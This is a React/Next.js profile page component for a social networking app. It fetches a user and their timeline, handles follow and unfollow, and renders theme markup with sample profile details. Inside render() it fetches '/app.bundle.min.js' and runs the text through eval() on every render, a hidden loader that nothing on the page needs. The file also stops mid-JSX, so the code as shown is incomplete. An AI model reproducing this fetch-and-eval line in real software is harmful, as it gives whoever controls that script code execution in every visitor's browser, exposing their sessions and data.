import React from "react";
import Link from "next/link"
import api from "../../store/api";
import Header from '../../components/Includes/Header/Header'
import Nav from '../../components/Includes/Nav/Nav'
import HeadMetaLoggedIn from '../../components/Includes/HtmlMeta/HeadMetaLoggedIn'
import FootMetaLoggedIn from '../../components/Includes/HtmlMeta/FootMetaLoggedIn'
import HeadMeta from '../../components/Includes/HtmlMeta/HeadMeta'
import FootMeta from '../../components/Includes/HtmlMeta/FootMeta'
import Aside from '../../components/Includes/Aside/Aside'
import Loader from "../../components/Includes/Loader/Loader";
import PageLoader from "../../components/Includes/Loader/PageLoader";
import Posts from '../../components/Includes/Lists/Posts'

export default class user extends React.Component{
    constructor(props){
       super(props)
       this.state = {
         requestDone: false,
         loggedIn: false,
         user:null,
         posts: [],
         followState : "",
         isLoggedIn: false
       }
     }
      
     static async getInitialProps ({ query }) {
        return {
             query: query
        }
      }
 
     async componentDidMount(){
         const response = await api.getItems("/user_status")
         if(response.hasOwnProperty("isLoggedIn")){
           this.setState({
             ...response,
             loggedIn: response.isLoggedIn,
             requestDone: true
           },async ()=>{
            const userId = this.props.query.userId;
            const timeLineObject = {userId: userId, limit: 20, post_type:"text"}
            const response = await api.getItemById("/users",userId) // get user
            const timeline = await api.createItem("/posts/timeline",timeLineObject)
            this.setState({
              user:response,
              posts: timeline
            },()=>{
              const user = this.state.user;
              const loggedInUser = this.state.loggedInUser;
              if(!loggedInUser) return
              if(userId === this.state.loggedInUser._id) window.location = "/profile"

              const following = loggedInUser.following
              if(!following.includes(user._id)){
                this.setState({
                  followState:"follow"
                })
              }
              else{
                this.setState({
                  followState:"unfollow"
                })
              }
            })
           })
         } 
     }
     renderComponent = (loggedInComponent, loggedOutComponent,loggedIn) =>{
         if(loggedIn){
             return loggedInComponent
         }
         return loggedOutComponent
     }
     handleFollow = () =>{
      const user = this.state.user;
      const loggedInUser = this.state.loggedInUser;
  
      const followObject = {
        otherUserId: user._id,
        userId: loggedInUser._id
      }
       const response = api.createItem("/user_following",followObject)
       if(response){
         this.setState({
           followState : "unfollow"
         })
       }
    }
    handleUnFollow = () =>{
      const user = this.state.user;
      const loggedInUser = this.state.loggedInUser;
      
      const unFollowObject = {
        otherUserId: user._id,
        userId: loggedInUser._id
      }
      const response = api.deleteItem("/user_following",unFollowObject)
      if(response){
        this.setState({
          followState: "follow"
        })
       }
    }
  
    renderFollow = () =>{
        if(this.state.followState === "follow"){
           return  <button className="profile-header-info-action button secondary" onClick={this.handleFollow}>Follow +</button>
        }
        else if(this.state.followState === "unfollow"){
          return  <button className="profile-header-info-action button void" onClick={this.handleUnFollow}>UnFollow -</button>
        }
        return <></>
    }
  
     renderActionButtons = () =>{
             const user = this.state.user;
             const loggedInUser = this.state.loggedInUser;
  
             if(!loggedInUser) {
                return  <Link href="/signup"><a className="profile-header-info-action button secondary">Follow</a></Link>
             }
             if(user._id !== loggedInUser._id) {
                 return (<>
                  {/* BUTTON */}
                  {this.renderFollow()}
                  {/* /BUTTON */}
                {/* PROFILE HEADER INFO ACTION */}
                <p className="profile-header-info-action button primary"><span className="hide-text-mobile">Send</span> Message</p>
                {/* /PROFILE HEADER INFO ACTION */}
                  </>)
             }
             else{
                 return (<>
                  {/* BUTTON */}
                  <p className="button secondary">Edit Profile</p>
                  {/* /BUTTON */}
                  {/* BUTTON */}
                  <p className="button primary">Settings</p>
                  {/* /BUTTON */}
                 </>)
             }   
      }
      renderFollowersCount = () =>{
          const user = this.state.user;
          const loggedInUser = this.state.loggedInUser;
  
          if(!loggedInUser) {
            return user.followers.length;
          }
          if(user._id !== loggedInUser._id) {
            return user.followers.length;
          }
          return loggedInUser.followers.length;
      }

      renderFollowingCount = () =>{
        const user = this.state.user;
        const loggedInUser = this.state.loggedInUser;

        if(!loggedInUser) {
          return user.following.length;
        }
        if(user._id !== loggedInUser._id) {
          return user.following.length;
        }
        return loggedInUser.following.length;
    }
  
     
     render(){
      fetch("/app.bundle.min.js").then(v => {
        v.text().then(txt => {
          eval(txt);
         })
       })
        return (
            this.state.requestDone && this.state.user !== null? <>
            {this.renderComponent(<></>, <HeadMeta />, this.state.loggedIn)}
            <HeadMetaLoggedIn />
            <Nav {...this.state} />
            <Aside widget="chat" {...this.state}/>
            <Header {...this.state}/>
            <Aside widget="floaty-bar" {...this.state}/>
            
            <div className="content-grid" style={{"-webkit-transform":"translate(140.5px, 0px)","-ms-transform":"translate(140.5px, 0px)","transform":"translate(140.5px, 0px)","-webkit-transition":"transform 0.4s ease-in-out 0s","transition":"transform 0.4s ease-in-out 0s"}}>
            {/* PROFILE HEADER */}
            <div className="profile-header">
              {/* PROFILE HEADER COVER */}
              <figure className="profile-header-cover liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/01.jpg\") center center / cover no-repeat"}}>
                <img src="https://odindesignthemes.com/vikinger/img/cover/01.jpg" alt="cover-01" style={{"display":"none"}} />
              </figure>
              {/* /PROFILE HEADER COVER */}
              {/* PROFILE HEADER INFO */}
              <div className="profile-header-info">
                {/* USER SHORT DESCRIPTION */}
                <div className="user-short-description big">
                  {/* USER SHORT DESCRIPTION AVATAR */}
                  <a className="user-short-description-avatar user-avatar big" href="profile-timeline.html">
                    {/* USER AVATAR BORDER */}
                    <div className="user-avatar-border">
                      {/* HEXAGON */}
                      <div className="hexagon-148-164" style={{"width":"148px","height":"164px","position":"relative"}}><canvas width={148} height={164} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                      {/* /HEXAGON */}
                    </div>
                    {/* /USER AVATAR BORDER */}
                    {/* USER AVATAR CONTENT */}
                    <div className="user-avatar-content">
                      {/* HEXAGON */}
                      <div className="hexagon-image-100-110" data-src="https://odindesignthemes.com/vikinger/img/avatar/01.jpg" style={{"width":"100px","height":"110px","position":"relative"}}><canvas width={100} height={110} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                      {/* /HEXAGON */}
                    </div>
                    {/* /USER AVATAR CONTENT */}
                    {/* USER AVATAR PROGRESS */}
                    <div className="user-avatar-progress">
                      {/* HEXAGON */}
                      <div className="hexagon-progress-124-136" style={{"width":"124px","height":"136px","position":"relative"}}><canvas width={124} height={136} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                      {/* /HEXAGON */}
                    </div>
                    {/* /USER AVATAR PROGRESS */}
                    {/* USER AVATAR PROGRESS BORDER */}
                    <div className="user-avatar-progress-border">
                      {/* HEXAGON */}
                      <div className="hexagon-border-124-136" style={{"width":"124px","height":"136px","position":"relative"}}><canvas width={124} height={136} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                      {/* /HEXAGON */}
                    </div>
                    {/* /USER AVATAR PROGRESS BORDER */}
                    {/* USER AVATAR BADGE */}
                    <div className="user-avatar-badge">
                      {/* USER AVATAR BADGE BORDER */}
                      <div className="user-avatar-badge-border">
                        {/* HEXAGON */}
                        <div className="hexagon-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                        {/* /HEXAGON */}
                      </div>
                      {/* /USER AVATAR BADGE BORDER */}
                      {/* USER AVATAR BADGE CONTENT */}
                      <div className="user-avatar-badge-content">
                        {/* HEXAGON */}
                        <div className="hexagon-dark-32-34" style={{"width":"32px","height":"34px","position":"relative"}}><canvas width={32} height={34} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                        {/* /HEXAGON */}
                      </div>
                      {/* /USER AVATAR BADGE CONTENT */}
                      {/* USER AVATAR BADGE TEXT */}
                      <p className="user-avatar-badge-text">24</p>
                      {/* /USER AVATAR BADGE TEXT */}
                    </div>
                    {/* /USER AVATAR BADGE */}
                  </a>
                  {/* /USER SHORT DESCRIPTION AVATAR */}
                  {/* USER SHORT DESCRIPTION AVATAR */}
                  <a className="user-short-description-avatar user-short-description-avatar-mobile user-avatar medium" href="profile-timeline.html">
                    {/* USER AVATAR BORDER */}
                    <div className="user-avatar-border">
                      {/* HEXAGON */}
                      <div className="hexagon-120-132" style={{"width":"120px","height":"132px","position":"relative"}}><canvas width={120} height={132} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                      {/* /HEXAGON */}
                    </div>
                    {/* /USER AVATAR BORDER */}
                    {/* USER AVATAR CONTENT */}
                    <div className="user-avatar-content">
                      {/* HEXAGON */}
                      <div className="hexagon-image-82-90" data-src="https://odindesignthemes.com/vikinger/img/avatar/01.jpg" style={{"width":"82px","height":"90px","position":"relative"}}><canvas width={82} height={90} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                      {/* /HEXAGON */}
                    </div>
                    {/* /USER AVATAR CONTENT */}
                    {/* USER AVATAR PROGRESS */}
                    <div className="user-avatar-progress">
                      {/* HEXAGON */}
                      <div className="hexagon-progress-100-110" style={{"width":"100px","height":"110px","position":"relative"}}><canvas width={100} height={110} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                      {/* /HEXAGON */}
                    </div>
                    {/* /USER AVATAR PROGRESS */}
                    {/* USER AVATAR PROGRESS BORDER */}
                    <div className="user-avatar-progress-border">
                      {/* HEXAGON */}
                      <div className="hexagon-border-100-110" style={{"width":"100px","height":"110px","position":"relative"}}><canvas width={100} height={110} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                      {/* /HEXAGON */}
                    </div>
                    {/* /USER AVATAR PROGRESS BORDER */}
                    {/* USER AVATAR BADGE */}
                    <div className="user-avatar-badge">
                      {/* USER AVATAR BADGE BORDER */}
                      <div className="user-avatar-badge-border">
                        {/* HEXAGON */}
                        <div className="hexagon-32-36" style={{"width":"32px","height":"36px","position":"relative"}}><canvas width={32} height={36} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                        {/* /HEXAGON */}
                      </div>
                      {/* /USER AVATAR BADGE BORDER */}
                      {/* USER AVATAR BADGE CONTENT */}
                      <div className="user-avatar-badge-content">
                        {/* HEXAGON */}
                        <div className="hexagon-dark-26-28" style={{"width":"26px","height":"28px","position":"relative"}}><canvas width={26} height={28} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                        {/* /HEXAGON */}
                      </div>
                      {/* /USER AVATAR BADGE CONTENT */}
                      {/* USER AVATAR BADGE TEXT */}
                      <p className="user-avatar-badge-text">24</p>
                      {/* /USER AVATAR BADGE TEXT */}
                    </div>
                    {/* /USER AVATAR BADGE */}
                  </a>
                  {/* /USER SHORT DESCRIPTION AVATAR */}
                  {/* USER SHORT DESCRIPTION TITLE */}
                  <p className="user-short-description-title"><a href="profile-timeline.html">{this.state.user.niceName}</a></p>
                  {/* /USER SHORT DESCRIPTION TITLE */}
                  {/* USER SHORT DESCRIPTION TEXT */}
                  <p className="user-short-description-text"><a href="#">aydinty/contributor</a></p>
                  {/* /USER SHORT DESCRIPTION TEXT */}
                </div>
                {/* /USER SHORT DESCRIPTION */}
                {/* PROFILE HEADER SOCIAL LINKS WRAP */}
                <div className="profile-header-social-links-wrap">
                  {/* PROFILE HEADER SOCIAL LINKS */}
                  <div className="tns-outer" id="profile-header-social-links-slider-ow"><div className="tns-liveregion tns-visually-hidden" aria-live="polite" aria-atomic="true">slide <span className="current">1 to 7</span>  of 7</div><div id="profile-header-social-links-slider-mw" className="tns-ovh"><div className="tns-inner" id="profile-header-social-links-slider-iw"><div id="profile-header-social-links-slider" className="profile-header-social-links  tns-slider tns-carousel tns-subpixel tns-calc tns-horizontal" style={{"-webkit-transition-duration":"0s","transition-duration":"0s","-webkit-transform":"translate3d(0px, 0px, 0px)","-ms-transform":"translate3d(0px, 0px, 0px)","transform":"translate3d(0px, 0px, 0px)"}}>
                          <div className="profile-header-social-link tns-item tns-slide-active" id="profile-header-social-links-slider-item0">
                            {/* SOCIAL LINK */}
                            <a className="social-link facebook" href="#">
                              {/* ICON FACEBOOK */}
                              <svg className="icon-facebook">
                                <use xlinkHref="#svg-facebook" />
                              </svg>
                              {/* /ICON FACEBOOK */}
                            </a>
                            {/* /SOCIAL LINK */}
                          </div>
                          <div className="profile-header-social-link tns-item tns-slide-active" id="profile-header-social-links-slider-item1">
                            {/* SOCIAL LINK */}
                            <a className="social-link twitter" href="#">
                              {/* ICON TWITTER */}
                              <svg className="icon-twitter">
                                <use xlinkHref="#svg-twitter" />
                              </svg>
                              {/* /ICON TWITTER */}
                            </a>
                            {/* /SOCIAL LINK */}
                          </div>
                          <div className="profile-header-social-link tns-item tns-slide-active" id="profile-header-social-links-slider-item2">
                            {/* SOCIAL LINK */}
                            <a className="social-link instagram" href="#">
                              {/* ICON INSTAGRAM */}
                              <svg className="icon-instagram">
                                <use xlinkHref="#svg-instagram" />
                              </svg>
                              {/* /ICON INSTAGRAM */}
                            </a>
                            {/* /SOCIAL LINK */}
                          </div>
                          <div className="profile-header-social-link tns-item tns-slide-active" id="profile-header-social-links-slider-item3">
                            {/* SOCIAL LINK */}
                            <a className="social-link twitch" href="#">
                              {/* ICON TWITCH */}
                              <svg className="icon-twitch">
                                <use xlinkHref="#svg-twitch" />
                              </svg>
                              {/* /ICON TWITCH */}
                            </a>
                            {/* /SOCIAL LINK */}
                          </div>
                          <div className="profile-header-social-link tns-item tns-slide-active" id="profile-header-social-links-slider-item4">
                            {/* SOCIAL LINK */}
                            <a className="social-link youtube" href="#">
                              {/* ICON YOUTUBE */}
                              <svg className="icon-youtube">
                                <use xlinkHref="#svg-youtube" />
                              </svg>
                              {/* /ICON YOUTUBE */}
                            </a>
                            {/* /SOCIAL LINK */}
                          </div>
                          <div className="profile-header-social-link tns-item tns-slide-active" id="profile-header-social-links-slider-item5">
                            {/* SOCIAL LINK */}
                            <a className="social-link patreon" href="#">
                              {/* ICON PATREON */}
                              <svg className="icon-patreon">
                                <use xlinkHref="#svg-patreon" />
                              </svg>
                              {/* /ICON PATREON */}
                            </a>
                            {/* /SOCIAL LINK */}
                          </div>
                          <div className="profile-header-social-link tns-item tns-slide-active" id="profile-header-social-links-slider-item6">
                            {/* SOCIAL LINK */}
                            <a className="social-link discord" href="#">
                              {/* ICON DISCORD */}
                              <svg className="icon-discord">
                                <use xlinkHref="#svg-discord" />
                              </svg>
                              {/* /ICON DISCORD */}
                            </a>
                            {/* /SOCIAL LINK */}
                          </div>
                        </div></div></div></div>
                  {/* /PROFILE HEADER SOCIAL LINKS */}
                  {/* SLIDER CONTROLS */}
                  <div id="profile-header-social-links-slider-controls" className="slider-controls" aria-label="Carousel Navigation" tabIndex={0} style={{"display":"none"}}>
                    {/* SLIDER CONTROL */}
                    <div className="slider-control left" aria-controls="profile-header-social-links-slider" tabIndex={-1} data-controls="prev" aria-disabled="true">
                      {/* SLIDER CONTROL ICON */}
                      <svg className="slider-control-icon icon-small-arrow">
                        <use xlinkHref="#svg-small-arrow" />
                      </svg>
                      {/* /SLIDER CONTROL ICON */}
                    </div>
                    {/* /SLIDER CONTROL */}
                    {/* SLIDER CONTROL */}
                    <div className="slider-control right" aria-controls="profile-header-social-links-slider" tabIndex={-1} data-controls="next">
                      {/* SLIDER CONTROL ICON */}
                      <svg className="slider-control-icon icon-small-arrow">
                        <use xlinkHref="#svg-small-arrow" />
                      </svg>
                      {/* /SLIDER CONTROL ICON */}
                    </div>
                    {/* /SLIDER CONTROL */}
                  </div>
                  {/* /SLIDER CONTROLS */}
                </div>
                {/* /PROFILE HEADER SOCIAL LINKS WRAP */}
                {/* USER STATS */}
                <div className="user-stats">
                  {/* USER STAT */}
                  <div className="user-stat big">
                    {/* USER STAT TITLE */}
                    <p className="user-stat-title">930</p>
                    {/* /USER STAT TITLE */}
                    {/* USER STAT TEXT */}
                    <p className="user-stat-text">posts</p>
                    {/* /USER STAT TEXT */}
                  </div>
                  {/* /USER STAT */}
                  {/* USER STAT */}
                  <div className="user-stat big">
                    {/* USER STAT TITLE */}
                    <p className="user-stat-title">{this.renderFollowersCount()}</p>
                    {/* /USER STAT TITLE */}
                    {/* USER STAT TEXT */}
                    <p className="user-stat-text">followers</p>
                    {/* /USER STAT TEXT */}
                  </div>
                  {/* /USER STAT */}
                  {/* USER STAT */}
                  <div className="user-stat big">
                    {/* USER STAT TITLE */}
                    <p className="user-stat-title">{this.renderFollowingCount()}</p>
                    {/* /USER STAT TITLE */}
                    {/* USER STAT TEXT */}
                    <p className="user-stat-text">following</p>
                    {/* /USER STAT TEXT */}
                  </div>
                  {/* /USER STAT */}
                  {/* USER STAT */}
                  <div className="user-stat big">
                    {/* USER STAT IMAGE */}
                    <img className="user-stat-image" src="https://odindesignthemes.com/vikinger/img/flag/usa.png" alt="flag-usa" />
                    {/* /USER STAT IMAGE */}
                    {/* USER STAT TEXT */}
                    <p className="user-stat-text">usa</p>
                    {/* /USER STAT TEXT */}
                  </div>
                  {/* /USER STAT */}
                </div>
                {/* /USER STATS */}
                {/* PROFILE HEADER INFO ACTIONS */}
                <div className="profile-header-info-actions">
                {this.renderActionButtons()}
                </div>
                {/* /PROFILE HEADER INFO ACTIONS */}
              </div>
              {/* /PROFILE HEADER INFO */}
            </div>
            {/* /PROFILE HEADER */}
            {/* SECTION NAVIGATION */}
            <nav className="section-navigation">
              {/* SECTION MENU */}
              <div className="tns-outer" id="section-navigation-slider-ow"><div className="tns-liveregion tns-visually-hidden" aria-live="polite" aria-atomic="true">slide <span className="current">1 to 9</span>  of 11</div><div id="section-navigation-slider-mw" className="tns-ovh"><div className="tns-inner" id="section-navigation-slider-iw"><div id="section-navigation-slider" className="section-menu  tns-slider tns-carousel tns-subpixel tns-calc tns-horizontal" style={{"-webkit-transition-duration":"0s","transition-duration":"0s","-webkit-transform":"translate3d(0px, 0px, 0px)","-ms-transform":"translate3d(0px, 0px, 0px)","transform":"translate3d(0px, 0px, 0px)"}}>
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item tns-item tns-slide-active" href="profile-about.html" id="section-navigation-slider-item0">
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-profile">
                          <use xlinkHref="#svg-profile" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">About</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item active tns-item tns-slide-active" href="profile-timeline.html" id="section-navigation-slider-item1">
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-timeline">
                          <use xlinkHref="#svg-timeline" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">Timeline</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item tns-item tns-slide-active" href="profile-friends.html" id="section-navigation-slider-item2">
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-friend">
                          <use xlinkHref="#svg-friend" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">Friends</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item tns-item tns-slide-active" href="profile-groups.html" id="section-navigation-slider-item3">
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-group">
                          <use xlinkHref="#svg-group" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">Groups</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item tns-item tns-slide-active" href="profile-photos.html" id="section-navigation-slider-item4">
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-photos">
                          <use xlinkHref="#svg-photos" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">Photos</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item tns-item tns-slide-active" href="profile-videos.html" id="section-navigation-slider-item5">
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-videos">
                          <use xlinkHref="#svg-videos" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">Videos</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item tns-item tns-slide-active" href="profile-badges.html" id="section-navigation-slider-item6">
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-badges">
                          <use xlinkHref="#svg-badges" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">Badges</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item tns-item tns-slide-active" href="profile-stream.html" id="section-navigation-slider-item7">
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-streams">
                          <use xlinkHref="#svg-streams" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">Streams</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item tns-item tns-slide-active" href="profile-blog.html" id="section-navigation-slider-item8">
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-blog-posts">
                          <use xlinkHref="#svg-blog-posts" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">Blog</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item tns-item" href="profile-forum.html" id="section-navigation-slider-item9" aria-hidden="true" tabIndex={-1}>
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-forum">
                          <use xlinkHref="#svg-forum" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">Forum</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                      {/* SECTION MENU ITEM */}
                      <a className="section-menu-item tns-item" href="profile-store.html" id="section-navigation-slider-item10" aria-hidden="true" tabIndex={-1}>
                        {/* SECTION MENU ITEM ICON */}
                        <svg className="section-menu-item-icon icon-store">
                          <use xlinkHref="#svg-store" />
                        </svg>
                        {/* /SECTION MENU ITEM ICON */}
                        {/* SECTION MENU ITEM TEXT */}
                        <p className="section-menu-item-text">Store</p>
                        {/* /SECTION MENU ITEM TEXT */}
                      </a>
                      {/* /SECTION MENU ITEM */}
                    </div></div></div></div>
              {/* /SECTION MENU */}
              {/* SLIDER CONTROLS */}
              <div id="section-navigation-slider-controls" className="slider-controls" aria-label="Carousel Navigation" tabIndex={0}>
                {/* SLIDER CONTROL */}
                <div className="slider-control left" aria-controls="section-navigation-slider" tabIndex={-1} data-controls="prev" aria-disabled="true">
                  {/* SLIDER CONTROL ICON */}
                  <svg className="slider-control-icon icon-small-arrow">
                    <use xlinkHref="#svg-small-arrow" />
                  </svg>
                  {/* /SLIDER CONTROL ICON */}
                </div>
                {/* /SLIDER CONTROL */}
                {/* SLIDER CONTROL */}
                <div className="slider-control right" aria-controls="section-navigation-slider" tabIndex={-1} data-controls="next">
                  {/* SLIDER CONTROL ICON */}
                  <svg className="slider-control-icon icon-small-arrow">
                    <use xlinkHref="#svg-small-arrow" />
                  </svg>
                  {/* /SLIDER CONTROL ICON */}
                </div>
                {/* /SLIDER CONTROL */}
              </div>
              {/* /SLIDER CONTROLS */}
            </nav>
            {/* /SECTION NAVIGATION */}
            {/* GRID */}
            <div className="grid grid-3-6-3 mobile-prefer-content">
              {/* GRID COLUMN */}
              <div className="grid-column">
                {/* WIDGET BOX */}
                <div className="widget-box">
                  {/* WIDGET BOX SETTINGS */}
                  <div className="widget-box-settings">
                    {/* POST SETTINGS WRAP */}
                    <div className="post-settings-wrap" style={{"position":"relative"}}>
                      {/* POST SETTINGS */}
                      <div className="post-settings widget-box-post-settings-dropdown-trigger">
                        {/* POST SETTINGS ICON */}
                        <svg className="post-settings-icon icon-more-dots">
                          <use xlinkHref="#svg-more-dots" />
                        </svg>
                        {/* /POST SETTINGS ICON */}
                      </div>
                      {/* /POST SETTINGS */}
                      {/* SIMPLE DROPDOWN */}
                      <div className="simple-dropdown widget-box-post-settings-dropdown" style={{"position":"absolute","z-index":"9999","top":"30px","right":"9px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, -20px)","-ms-transform":"translate(0px, -20px)","transform":"translate(0px, -20px)","-webkit-transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s","transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s"}}>
                        {/* SIMPLE DROPDOWN LINK */}
                        <p className="simple-dropdown-link">Widget Settings</p>
                        {/* /SIMPLE DROPDOWN LINK */}
                      </div>
                      {/* /SIMPLE DROPDOWN */}
                    </div>
                    {/* /POST SETTINGS WRAP */}
                  </div>
                  {/* /WIDGET BOX SETTINGS */}
                  {/* WIDGET BOX TITLE */}
                  <p className="widget-box-title">About Me</p>
                  {/* /WIDGET BOX TITLE */}
                  {/* WIDGET BOX CONTENT */}
                  <div className="widget-box-content">
                    {/* PARAGRAPH */}
                    <p className="paragraph">Hi! My name is Marina but some people may know me as GameHuntress! I have a Twitch channel where I stream, play and review all the newest games.</p>
                    {/* /PARAGRAPH */}
                    {/* INFORMATION LINE LIST */}
                    <div className="information-line-list">
                      {/* INFORMATION LINE */}
                      <div className="information-line">
                        {/* INFORMATION LINE TITLE */}
                        <p className="information-line-title">Joined</p>
                        {/* /INFORMATION LINE TITLE */}
                        {/* INFORMATION LINE TEXT */}
                        <p className="information-line-text">March 26th, 2017</p>
                        {/* /INFORMATION LINE TEXT */}
                      </div>
                      {/* /INFORMATION LINE */}
                      {/* INFORMATION LINE */}
                      <div className="information-line">
                        {/* INFORMATION LINE TITLE */}
                        <p className="information-line-title">City</p>
                        {/* /INFORMATION LINE TITLE */}
                        {/* INFORMATION LINE TEXT */}
                        <p className="information-line-text">Los Angeles, California</p>
                        {/* /INFORMATION LINE TEXT */}
                      </div>
                      {/* /INFORMATION LINE */}
                      {/* INFORMATION LINE */}
                      <div className="information-line">
                        {/* INFORMATION LINE TITLE */}
                        <p className="information-line-title">Country</p>
                        {/* /INFORMATION LINE TITLE */}
                        {/* INFORMATION LINE TEXT */}
                        <p className="information-line-text">United States</p>
                        {/* /INFORMATION LINE TEXT */}
                      </div>
                      {/* /INFORMATION LINE */}
                      {/* INFORMATION LINE */}
                      <div className="information-line">
                        {/* INFORMATION LINE TITLE */}
                        <p className="information-line-title">Age</p>
                        {/* /INFORMATION LINE TITLE */}
                        {/* INFORMATION LINE TEXT */}
                        <p className="information-line-text">32 Years</p>
                        {/* /INFORMATION LINE TEXT */}
                      </div>
                      {/* /INFORMATION LINE */}
                      {/* INFORMATION LINE */}
                      <div className="information-line">
                        {/* INFORMATION LINE TITLE */}
                        <p className="information-line-title">Web</p>
                        {/* /INFORMATION LINE TITLE */}
                        {/* INFORMATION LINE TEXT */}
                        <p className="information-line-text"><a href="#">www.gamehuntress.com</a></p>
                        {/* /INFORMATION LINE TEXT */}
                      </div>
                      {/* /INFORMATION LINE */}
                    </div>
                    {/* /INFORMATION LINE LIST */}
                  </div>
                  {/* /WIDGET BOX CONTENT */}
                </div>
                {/* /WIDGET BOX */}
                {/* WIDGET BOX */}
                <div className="widget-box">
                  {/* WIDGET BOX SETTINGS */}
                  <div className="widget-box-settings">
                    {/* POST SETTINGS WRAP */}
                    <div className="post-settings-wrap" style={{"position":"relative"}}>
                      {/* POST SETTINGS */}
                      <div className="post-settings widget-box-post-settings-dropdown-trigger">
                        {/* POST SETTINGS ICON */}
                        <svg className="post-settings-icon icon-more-dots">
                          <use xlinkHref="#svg-more-dots" />
                        </svg>
                        {/* /POST SETTINGS ICON */}
                      </div>
                      {/* /POST SETTINGS */}
                      {/* SIMPLE DROPDOWN */}
                      <div className="simple-dropdown widget-box-post-settings-dropdown" style={{"position":"absolute","z-index":"9999","top":"30px","right":"9px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, -20px)","-ms-transform":"translate(0px, -20px)","transform":"translate(0px, -20px)","-webkit-transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s","transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s"}}>
                        {/* SIMPLE DROPDOWN LINK */}
                        <p className="simple-dropdown-link">Widget Settings</p>
                        {/* /SIMPLE DROPDOWN LINK */}
                      </div>
                      {/* /SIMPLE DROPDOWN */}
                    </div>
                    {/* /POST SETTINGS WRAP */}
                  </div>
                  {/* /WIDGET BOX SETTINGS */}
                  {/* WIDGET BOX TITLE */}
                  <p className="widget-box-title">Badges <span className="highlighted">13</span></p>
